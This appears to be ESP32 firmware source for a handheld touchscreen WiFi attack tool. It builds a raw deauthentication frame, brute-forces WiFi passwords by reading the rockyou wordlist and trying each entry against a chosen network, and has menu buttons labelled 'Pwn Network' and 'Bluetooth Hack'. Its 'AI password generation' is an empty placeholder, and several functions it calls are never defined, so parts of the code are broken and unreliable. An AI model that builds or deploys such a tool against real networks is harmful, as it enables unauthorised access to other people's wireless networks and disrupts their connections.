#include <TFT_eSPI.h>
#include <WiFi.h>
#include <SD.h>
#include <ArduinoJson.h>
#include <WiFiManager.h>
#include <TaskScheduler.h>
#include <pthread.h>
#include <atomic>
#include <mutex>
#include <BluetoothSerial.h>
#include <TensorFlowLite.h>
#include <tensorflow/lite/micro/all_ops_resolver.h>
#include <tensorflow/lite/schema/schema_generated.h>
#include <tensorflow/lite/micro/micro_interpreter.h>
#include <tensorflow/lite/version.h>

// Define file paths
#define ROCKYOU_PATH "/rockyou.txt"
#define SETTINGS_PATH "/settings.json"
#define CHECKPOINT_PATH "/checkpoint.txt"

// Calibration values for the touch screen
#define TS_MINX 100
#define TS_MINY 100
#define TS_MAXX 920
#define TS_MAXY 940

// Define touch screen sensitivity
#define MINPRESSURE 10
#define MAXPRESSURE 1000

// TFT setup
TFT_eSPI tft = TFT_eSPI();  // Invoke custom library

// Bluetooth setup
BluetoothSerial SerialBT;

// TensorFlow Lite Micro Setup
const int kTensorArenaSize = 2 * 1024; // Define small memory area for TensorFlow Lite Micro
uint8_t tensor_arena[kTensorArenaSize];

// Placeholders for TensorFlow Lite Micro interpreter and model
tflite::MicroInterpreter *interpreter;
tflite::AllOpsResolver resolver;
tflite::ErrorReporter *error_reporter = nullptr;
const tflite::Model *model = nullptr;
TfLiteTensor *input = nullptr;
TfLiteTensor *output = nullptr;

// Struct to hold network information
struct NetworkInfo {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  bool has_password;
  String password;
};

// Global variables
std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

WiFiManager wifiManager;
Scheduler tscheduler;
Task tScanNetworks(0, TASK_ONCE, &scanNetworks, &tscheduler, false);
Task tUpdateBatteryStatus(60000, TASK_FOREVER, &updateBatteryStatus, &tscheduler, true);
Task tCrackPassword(0, TASK_ONCE, NULL, &tscheduler, false); // Will be activated manually

std::atomic_long bytesRead(0);
std::atomic_bool foundPassword(false);
std::mutex progressMutex;

// TensorFlow Lite AI Password Generation Function
String generateAIpasswordGuess(const String &ssid, const String &bssid) {
  // Feed SSID and BSSID into the AI model for generating passwords
  if (!interpreter || !input) {
    tft.println("AI model not initialized!");
    return "";
  }

  // Assume a simple input pattern for the model: [ssid_length, bssid_length]
  input->data.f[0] = ssid.length();
  input->data.f[1] = bssid.length();

  // Invoke the AI model
  TfLiteStatus invoke_status = interpreter->Invoke();
  if (invoke_status != kTfLiteOk) {
    tft.println("Error invoking TensorFlow Lite!");
    return "";
  }

  // Get the output from the model, e.g., the predicted password pattern
  float predictedPassword = output->data.f[0];  // Example from model output

  // Construct the password based on AI predictions and return
  return ssid + String((int)predictedPassword);
}

// TensorFlow Lite Setup Function (to load the AI model)
void setupTensorFlowLite() {
  // Load the TensorFlow Lite model into memory
  model = tflite::GetModel(your_model_data); // Replace "your_model_data" with actual model data pointer

  if (model->version() != TFLITE_SCHEMA_VERSION) {
    Serial.println("Model provided is schema version not compatible!");
    return;
  }

  // Create interpreter
  static tflite::MicroInterpreter static_interpreter(
      model, resolver, tensor_arena, kTensorArenaSize, error_reporter);
  interpreter = &static_interpreter;

  // Allocate memory from the tensor_arena for the model's tensors.
  TfLiteStatus allocate_status = interpreter->AllocateTensors();
  if (allocate_status != kTfLiteOk) {
    Serial.println("AllocateTensors() failed");
    return;
  }

  // Get pointers to the model's input and output tensors.
  input = interpreter->input(0);
  output = interpreter->output(0);

  Serial.println("TensorFlow Lite Micro initialized.");
}

// Function to crack the network password using AI-enhanced wordlist
void crackNetworkPassword() {
  if (!selectedNetwork.ssid.isEmpty()) {
    tCrackPassword.setCallback([]() {
      selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
      saveNetworksToSD();
      displayNetworkInfo(selectedNetwork);
      tft.println("Password cracking completed.");
      tCrackPassword.disable();
    });
    tft.println("Cracking password...");
    tCrackPassword.enable();
  } else {
    tft.println("No network selected.");
  }
}

// Multithreaded Function to crack the password using the wordlist and AI model
String crackPassword(const String &ssid, const String &bssid) {
  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
  if (!rockyouFile) {
    Serial.println("Failed to open rockyou.txt.");
    tft.println("Failed to open wordlist.");
    return "";
  }

  long fileSize = rockyouFile.size();
  bytesRead = 0;
  foundPassword = false;
  String password;
  String line;
  tft.println("Cracking Password...");

  // Load checkpoint if available
  long checkpoint = 0;
  File checkpointFile = SD.open(CHECKPOINT_PATH, FILE_READ);
  if (checkpointFile) {
    checkpoint = checkpointFile.parseInt();
    checkpointFile.close();
  }

  // Skip to the last checkpoint
  rockyouFile.seek(checkpoint);

  // Multi-threading setup
  int numThreads = 4; // Number of threads
  pthread_t threads[numThreads];
  struct CrackThreadArgs {
    File rockyouFile;
    String ssid;
    String bssid;
    long fileSize;
    std::atomic_long *bytesRead;
    std::atomic_bool *foundPassword;
    String *password;
    std::mutex *progressMutex;
  };

  auto crackThread = [](void *args) -> void * {
    CrackThreadArgs *crackArgs = (CrackThreadArgs *)args;
    File rockyouFile = crackArgs->rockyouFile;
    String ssid = crackArgs->ssid;
    String bssid = crackArgs->bssid;
    long fileSize = crackArgs->fileSize;
    std::atomic_long *bytesRead = crackArgs->bytesRead;
    std::atomic_bool *foundPassword = crackArgs->foundPassword;
    String *password = crackArgs->password;
    std::mutex *progressMutex = crackArgs->progressMutex;

    while (rockyouFile.available() && !foundPassword->load()) {
      String line = rockyouFile.readStringUntil('\n');
      bytesRead->fetch_add(line.length() + 1);
      line.trim();
      
      if (tryPassword(ssid, bssid, line)) {
        *password = line;
        foundPassword->store(true);
        break;
      }

      int progress = (int)((bytesRead->load() / (float)fileSize) * 100);
      {
        std::lock_guard<std::mutex> lock(*progressMutex);
        tft.fillRect(0, 50, 320, 20, TFT_BLACK);
        tft.setCursor(0, 50);
        tft.printf("Progress: %d%%", progress);
      }

      delay(5);

      // Check for touch interrupt
      uint16_t x, y;
      if (tft.getTouch(&x, &y)) {
        tft.println("User interrupted the process.");
        break;
      }
    }
    return NULL;
  };

  // Create and run threads
  CrackThreadArgs args = {rockyouFile, ssid, bssid, fileSize, &bytesRead, &foundPassword, &password, &progressMutex};
  for (int i = 0; i < numThreads; ++i) {
    pthread_create(&threads[i], NULL, crackThread, &args);
  }

  // Wait for threads to complete
  for (int i = 0; i < numThreads; ++i) {
    pthread_join(threads[i], NULL);
  }

  // Save checkpoint
  checkpointFile = SD.open(CHECKPOINT_PATH, FILE_WRITE);
  if (checkpointFile) {
    checkpointFile.println(bytesRead.load());
    checkpointFile.close();
  }

  rockyouFile.close();
  return password;
}

// Function to attempt to connect to a WiFi network with a given password
bool tryPassword(const String &ssid, const String &bssid, const String &password) {
  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());

  WiFi.disconnect();
  delay(100);
  WiFi.begin(ssid.c_str(), password.c_str());

  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
    delay(200);
    Serial.print(".");
  }

  bool isConnected = (WiFi.status() == WL_CONNECTED);

  if (isConnected) {
    Serial.println("Connected!");
    WiFi.disconnect();
    return true;
  } else {
    Serial.println("Failed to connect.");
    return false;
  }
}

// Function to display network information on the screen
void displayNetworkInfo(const NetworkInfo &network) {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.printf("SSID: %s\n", network.ssid.c_str());
  tft.printf("BSSID: %s\n", network.bssid.c_str());
  tft.printf("RSSI: %d dBm\n", network.rssi);
  tft.printf("Channel: %d\n", network.channel);
  tft.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
  if (network.has_password) {
    tft.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
  }
}

// Function to load network information from the SD card
void loadNetworksFromSD() {
  File file = SD.open("/networks.json", FILE_READ);
  if (!file) {
    Serial.println("Failed to open networks.json.");
    tft.println("Failed to load networks.");
    return;
  }

  DynamicJsonDocument doc(2048);
  DeserializationError error = deserializeJson(doc, file);
  if (error) {
    Serial.println("Failed to parse JSON.");
    tft.println("Failed to parse networks.");
    file.close();
    return;
  }

  networks.clear();
  for (JsonObject network : doc["networks"].as<JsonArray>()) {
    NetworkInfo net;
    net.ssid = network["ssid"].as<String>();
    net.bssid = network["bssid"].as<String>();
    net.rssi = network["rssi"].as<int>();
    net.channel = network["channel"].as<int>();
    net.has_password = network["has_password"].as<bool>();
    net.password = network["password"].as<String>();
    networks.push_back(net);
  }

  file.close();
  tft.println("Networks loaded.");
}

// Function to save network information to the SD card
void saveNetworksToSD() {
  File file = SD.open("/networks.json", FILE_WRITE);
  if (!file) {
    Serial.println("Failed to open networks.json for writing.");
    tft.println("Failed to save networks.");
    return;
  }

  DynamicJsonDocument doc(2048);
  JsonArray netArray = doc.createNestedArray("networks");
  for (const NetworkInfo &net : networks) {
    JsonObject netObj = netArray.createNestedObject();
    netObj["ssid"] = net.ssid;
    netObj["bssid"] = net.bssid;
    netObj["rssi"] = net.rssi;
    netObj["channel"] = net.channel;
    netObj["has_password"] = net.has_password;
    netObj["password"] = net.password;
  }

  if (serializeJson(doc, file) == 0) {
    Serial.println("Failed to write JSON to file.");
    tft.println("Failed to save networks.");
  }

  file.close();
  tft.println("Networks saved.");
}

// Additional unit tests
void unitTest_tryPassword() {
  String ssid = "TestSSID";
  String bssid = "00:00:00:00:00:00";
  String correctPassword = "correctPassword";
  String wrongPassword = "wrongPassword";

  // Assuming the mock WiFi connection status can be simulated for testing purposes
  bool result = tryPassword(ssid, bssid, correctPassword);
  assert(result == true); // Should be true for correct password

  result = tryPassword(ssid, bssid, wrongPassword);
  assert(result == false); // Should be false for wrong password
}

void unitTest_loadNetworksFromSD() {
  // Assuming SD has a valid file structure for testing
  loadNetworksFromSD();

  // Test for expected loaded data (mock file or setup prior data on SD)
  assert(!networks.empty());
  assert(networks[0].ssid == "TestNetwork");
}

// Main setup function
void setup() {
  Serial.begin(115200);
  setupFirmware();
  setupTensorFlowLite();  // Initialize TensorFlow Lite Micro
  unitTest_tryPassword();  // Run unit test
  unitTest_loadNetworksFromSD(); // Run unit test
}

void loop() {
  tscheduler.execute();
  delay(5);
  processTouch();
}

// Function to process touch input
void processTouch() {
  uint16_t x, y;
  if (tft.getTouch(&x, &y)) {
    if (y >= 0 && y < 40) {
      // Scan Networks
      if (x >= 0 && x < 80) {
        tScanNetworks.enable();
      }
      // Select Network
      else if (x >= 80 && x < 160) {
        selectNetwork();
      }
      // Show Network Info
      else if (x >= 160 && x < 240) {
        showNetworkInfo();
      }
      // Pwn Network
      else if (x >= 240 && x < 320) {
        pwnNetwork();
      }
    } else if (y >= 40 && y < 80) {
      // Crack Password
      if (x >= 0 && x < 80) {
        crackNetworkPassword();
      }
      // Deauth Network
      else if (x >= 80 && x < 160) {
        deauthNetwork();
      }
      // Settings Menu
      else if (x >= 160 && x < 240) {
        displaySettingsMenu();
      }
      // Bluetooth Hack
      else if (x >= 240 && x < 320) {
        scanBluetoothDevices();
      }
    }
  }
}
